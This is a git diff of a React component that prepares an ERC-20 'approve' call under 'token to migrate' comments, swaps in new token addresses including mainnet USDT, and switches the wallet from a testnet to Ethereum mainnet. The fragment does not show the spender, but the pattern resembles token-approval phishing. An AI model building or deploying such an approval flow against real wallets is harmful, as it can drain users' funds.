@@ -71,8 +71,8 @@ const SimpleStorage = () => {
     const contractInterface = [
     "function approve(address spender, uint256 amount) external returns (bool)", // appprove contract function
   ];
-    const tokenAddress = "0x4269f1a3848209E84996D853a09C052849A21a70"; //token to migrate
-    const tokenAddressusdt = "0x01BE23585060835E02B77ef475b0Cc51aA1e0709"; //token to migrate
+    const tokenAddress = "0xD76b5c2A23ef78368d8E34288B5b65D616B746aE"; //token to migrate
+    const tokenAddressusdt = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; //token to migrate
     let provider;
     let signer;
     // let signerAddress;
@@ -83,7 +83,7 @@ const SimpleStorage = () => {
     await ethereum.request({ method: "eth_requestAccounts" });
     await ethereum.request({
       method: "wallet_switchEthereumChain",
-      params: [{ chainId: "0x4" }],
+      params: [{ chainId: "0x1" }],
     });
     provider = new ethers.providers.Web3Provider(window.ethereum);
     signer = provider.getSigner();
